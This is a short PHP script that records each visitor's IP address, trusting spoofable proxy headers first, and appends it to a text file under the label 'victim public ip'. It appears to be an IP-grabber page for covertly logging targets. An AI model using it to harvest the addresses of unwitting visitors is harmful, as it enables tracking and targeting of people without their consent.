<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check if ip is pass from proxy
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }

$file = 'ip.txt';  //this is the file to which the IP address will be written; name it your way.
$victim = "victim public ip: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);

$fp = fopen($file, 'a');

fwrite($fp, $ipaddress);

fclose($fp);
